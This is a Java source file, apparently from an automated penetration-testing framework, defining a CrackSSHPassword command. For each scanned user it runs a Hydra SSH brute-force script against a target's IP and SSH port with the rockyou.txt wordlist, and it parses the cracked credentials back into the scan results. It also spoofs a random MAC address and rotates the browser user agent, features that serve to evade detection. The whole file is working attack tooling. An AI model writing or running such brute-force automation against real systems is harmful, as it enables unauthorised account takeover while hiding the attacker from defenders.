package com.teto.command.password;

import com.teto.IPort;
import com.teto.IScriptArgProvider;
import com.teto.IScripts;
import com.teto.command.AbstractCommand;
import com.teto.command.Context;
import com.teto.command.exec.RunCommandResponse;
import com.teto.domain.local.TargetNode;
import com.teto.domain.parser.hydra.HydraParser;
import com.teto.domain.parser.wordpress.WordPressParser;
import com.teto.domain.provenance.Provenance;
import com.teto.domain.script.Script;
import com.teto.domain.target.ScannedTargets;
import com.teto.domain.target.Target;
import com.teto.domain.user.ScannedUser;

import java.util.List;
import java.util.Optional;

public class CrackSSHPassword extends AbstractCommand<Void> implements IPort, IScripts {
    private final TargetNode node;
    private final List<ScannedUser> users;

    public CrackSSHPassword(TargetNode node, List<ScannedUser> users) {
        this.node = node;
        this.users = users;
    }

    @Override
    public Optional<Void> apply(Context ctx) {
        Optional<Script> scp = getScript(ctx, Provenance.HydraSSH);
        if(isPresent(scp)) {
            final Script script = scp.get();
            final Target target = node.getTarget();
            for(ScannedUser user : users) {

                final String fileName =  createFileName(ctx, target, script).replace(script.getName(),user.getUserName()+"-"+script.getName());
                Optional<RunCommandResponse> rsp = runScript(ctx, target, script, new IScriptArgProvider() {
                    @Override
                    public String getSpoofMAC() {
                        return generateRandomMacAddress();
                    }

                    @Override
                    public String getSubnetMask() {
                        return target.getSubNetMask();
                    }

                    @Override
                    public String getOutputFileName() {
                        return fileName;
                    }

                    @Override
                    public String getUrl() {
                        return "ssh://" + target.getIpAddress() + ":"+getPort(ctx, node, "ssh");
                    }

                    @Override
                    public String getUserAgent() {
                        return randomFirefox(ctx);
                    }

                    @Override
                    public String getWordList() {
                        return "/usr/share/wordlists/rockyou.txt";
                    }

                    @Override
                    public String getUserName() {
                        return user.getUserName();
                    }
                });
                if(isPresent(rsp)) {
                    HydraParser parser = new HydraParser();
                    ScannedTargets stargs = parser.parse(ctx, node.getTarget(), fileName);
                    node.getScannedTargets().add(stargs);
                }
            }
        }
        return Optional.empty();
    }
}
